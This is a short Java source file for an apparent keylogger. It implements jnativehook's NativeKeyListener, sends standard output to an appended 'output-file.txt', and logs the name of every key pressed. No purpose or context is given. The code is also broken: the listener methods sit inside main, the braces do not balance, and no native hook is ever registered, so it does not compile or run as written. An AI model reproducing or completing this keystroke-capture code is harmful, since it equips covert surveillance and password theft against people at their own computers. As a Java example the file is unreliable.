package main;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class main implements NativeKeyListener
{
	

	public static void main(String[] args) 
	{
		try {
			
			File file=new File("output-file.txt");
			FileOutputStream fos=new FileOutputStream(file,true);
			System.setOut(new PrintStream(fos));
		
		}catch (FileNotFoundException e1) {
		 
			e1.printStackTrace();

		}

		
		public void nativeKeyPressed(NativeKeyEvent e) {
			System.out.println("Pressed:"+ NativeKeyEvent.getKeyText(e.getKeyCode()));
			
		}

		
		public void nativeKeyReleased(NativeKeyEvent arg0) {
		
			
		}

		
		public void nativeKeyTyped(NativeKeyEvent arg0) {
			
			
		}

	}
